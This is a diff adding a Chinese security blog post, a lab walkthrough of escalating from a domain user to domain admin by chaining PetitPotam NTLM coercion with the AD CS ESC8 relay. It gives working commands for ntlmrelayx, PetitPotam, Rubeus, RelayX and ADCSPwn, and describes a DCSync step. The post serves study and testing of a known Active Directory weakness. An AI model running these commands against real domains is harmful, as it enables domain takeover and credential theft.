@@ -1,0 +1,269 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>从 0 到 DA：PetitPotam + AD CS Relay Attack | 3ND</title>
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1628667956025">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="从 0 到 DA：PetitPotam + AD CS Relay Attack | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="@harmj0y 和 @tifkin_ 在 Black Hat USA 2021 中发表了  Certified Pre-Owned: Abusing Active Directory Certificate Services，披露了 AD..." />
+    <meta name="keywords" content="AD,Kerberos" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1628667956025" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    <a href="https://github.com/inspiringz" target="_blank">
+      <i class="ri-github-fill"></i>
+    </a>
+    <a href="mailto:z@3nd.xyz" target="_blank">
+      <i class="ri-mail-send-fill"></i>
+  </a>
+  <a href="#">
+    <i class="ri-fire-fill"></i>
+</a>
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              从 0 到 DA：PetitPotam + AD CS Relay Attack
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-08-11
+              </span>
+              <span>
+                4 min read
+              </span>
+              <span class="page-view" key="20210811151838" title="从 0 到 DA：PetitPotam + AD CS Relay Attack">
+              </span>
+              
+                <a href="https://3nd.xyz/tag/ad/" class="post-tag">
+                  # AD
+                </a>
+                
+                <a href="https://3nd.xyz/tag/kerberos/" class="post-tag">
+                  # Kerberos
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <p><a href="https://twitter.com/harmj0y">@harmj0y</a> 和 <a href="https://twitter.com/tifkin_">@tifkin_</a> 在 Black Hat USA 2021 中发表了  <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned: Abusing Active Directory Certificate Services</a>，披露了 AD CS（Active Directory Certificate Services,  Active Directory 证书服务）中存在的一些漏洞攻击面及利用方法。其中一种默认的错误配置 <code>ESC8</code> - NTLM 中继到 AD CS HTTP 端点，允许攻击者将用户/机器身份验证中继到 AD CS 服务器并获取用户/机器证书，获取证书后可以为用户/机器请求 TGT / TGS 票据，获取相应的权限在域内开展活动。</p>
+<p><a href="https://github.com/topotam/PetitPotam">PetitPotam</a> 是由 <a href="https://twitter.com/topotam77">Gilles Lionel @topotam77</a>  发现的一种新的 NTLM 中继攻击方式，其工作原理是强制 Windows 主机通过 MS-EFSRPC EfsRpcOpenFileRaw 函数向其他机器进行身份验证。</p>
+<p>结合 PetitPotam 与 ESC8，能够实现从低权限域用户提升到域管理员权限，从而实现对整个域环境的控制。</p>
+<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/2021/1AE2CA78-94A4-4E0A-81D0-772423AB3AA6.png" alt="" loading="lazy"></figure>
+<h3 id="测试环境">测试环境</h3>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/2021/784D629D-68BF-4BC7-A98F-E2414ECBFE29.png" alt="" loading="lazy"></figure>
+<h3 id="查找-ca">查找 CA</h3>
+<p>可以通过 Windows <a href="https://lolbas-project.github.io/">LOLBAS</a> <code>certutil.exe</code> （-TCAInfo/-CA ...）在域中定位 AD CS 服务器：</p>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/2021/CD0F4939-9912-4788-A2E9-DB3DA6A80934.png" alt="" loading="lazy"></figure>
+<h3 id="impacket">Impacket</h3>
+<p>0. 在 Darwin 上安装支持 AD CS Relay Attack 的 impacket 包</p>
+<pre><code class="language-sh">git clone https://github.com/Tw1sm/impacket/
+cd impacket
+git switch ntlmrelayx-adcs-attack
+python3 setup.py install
+</code></pre>
+<p>1. 在 Darwin 上准备 Relay 到 AD CS（S2008, 172.16.79.8) 上运行的 CA Web 注册角色服务</p>
+<pre><code class="language-sh">ntlmrelayx.py -t http://172.16.79.8/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/2021/EAFEEA1D-7BF4-4F2F-81F5-32B126CA4E67.png" alt="" loading="lazy"></figure>
+<p>2. 在 Win10 上执行 PetitPotam，触发 PDC（172.16.79.2）向 Darwin（172.16.79.1）进行身份认证以 NTLM Relay</p>
+<pre><code class="language-sh">PetitPotam.exe 172.16.79.1 172.16.79.2
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/2021/0CC1A5A4-65FF-40C2-B971-0DC3E17246A2.png" alt="" loading="lazy"></figure>
+<p>Darwin 上运行的 Ntlmrelay 将生成 CSR（Certificate Signing Request, 证书签名请求）并尝试滥用存在漏洞的 PKI 模板来生成证书：</p>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/2021/584A006A-7F7C-4353-B841-EA30CABCC84A.png" alt="" loading="lazy"></figure>
+<p>3. 请求 <code>2012DC$</code> TGT</p>
+<p>在 Win10 上，通过 Rubeus 为 <code>2012dc$</code> 计算机帐户请求 Kerberos TGT：</p>
+<pre><code class="language-sh">Rubeus.exe asktgt /outfile:kirbi /user:2012dc$ /ptt /certificate:MIIRXQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghEUMI...
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/2021/16DFBB0B-CA7D-426C-86D1-EB638DA27EED.png" alt="" loading="lazy"></figure>
+<p><code>klist</code> 查看当前登录会话缓存的 Kerberos 票证中存在 <code>2012dc$</code> 的 TGT ：</p>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/2021/98F8889A-0F3C-4202-95E7-DF15E5A3CB9A.png" alt="" loading="lazy"></figure>
+<p>4. DCSync 获取 DA NTLM Hash</p>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/2021/5B0D4DCF-2008-4BCE-99B6-C67470C4E059.png" alt="" loading="lazy"></figure>
+<h3 id="relayx">RelayX</h3>
+<p><a href="https://github.com/Ridter/RelayX">RelayX</a> 将几个比较好用的relay集成到了一起，提高了测试效率：</p>
+<pre><code class="language-sh">python relayx.py live.local/002:'LIVE@2021'@172.16.79.2 -r 172.16.79.1 -dc-ip 172.16.79.8 -m pki -t efs --template=DomainController
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/2021/127CA129-F566-4DD0-8454-028E5519E44A.png" alt="" loading="lazy"></figure>
+<p>获取<code>2012dc$</code> 机器账号证书后通过 Rubeus 进行后续攻击即可。</p>
+<h3 id="adcspwn">ADCSPwn</h3>
+<p><a href="https://github.com/bats3c/ADCSPwn">ADCSPwn</a> 由 C# 编写，编译后方便通过 execute-assembly 内存加载运行，通过 PetitPotam NTLM Relay 到 AD CS 申请机器账户证书。此外，ADCSPwn 需要被触发进行身份认证的远程机器上开启 <strong>WebClient</strong> 服务（默认未安装，手动开启，可以参考 <a href="https://camerondwyer.com/2014/11/12/how-to-installenable-the-webclient-webdav-service-on-windows-server-2012-to-openedit-sharepoint-files/">How to install/enable the WebClient (WebDAV) Service on Windows Server 2012 to open/edit SharePoint files</a> ）</p>
+<blockquote>
+<p>ADCSPwn 在申请CA证书时采用了轮询的方式遍历所有证书模板尝试申请，普通域成员机器使用证书模版 Machine，DC 使用证书模版 DomainController，ADCSPwn 判断证书模版是否可用时匹配响应包中的“Certificate Request Denied”，而在简体中文换进下应该是“证书申请被拒绝”，可以修改  ADCSPwn/RelayServer.cs 382 行 if (responseFromServer.Contains(&quot;Certificate Request Denied&quot;)) 中的 &quot;Certificate Request Denied&quot; 为 &quot;locDenied&quot;（证书申请被拒绝响应页面中的 HTML 元素 ID ）来适配多语言环境。此问题已在 https://github.com/bats3c/ADCSPwn/pull/5 中更新解决。</p>
+</blockquote>
+<pre><code class="language-sh">execute-assembly /path/to/ADCSPwn.exe --adcs s2008.live.local --remote 2012dc.live.local --port 9001
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/2021/5C8EB818-8C66-4020-8102-960B7A4254CB.png" alt="" loading="lazy"></figure>
+<p>获取<code>2012dc$</code> 机器账号证书后通过 Rubeus 进行后续攻击即可。</p>
+<p>- 参考 -：</p>
+<ul>
+<li>https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf</li>
+<li>https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/</li>
+<li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/</li>
+<li>https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/</li>
+</ul>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83">测试环境</a></li>
+<li><a href="#%E6%9F%A5%E6%89%BE-ca">查找 CA</a></li>
+<li><a href="#impacket">Impacket</a></li>
+<li><a href="#relayx">RelayX</a></li>
+<li><a href="#adcspwn">ADCSPwn</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://3nd.xyz/post/2021-02-08-java-security-learning/">
+                  <h3 class="post-title">
+                    Java Security Study Notes (Basic)
+                  </h3>
+                </a>
+              </div>
+              
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
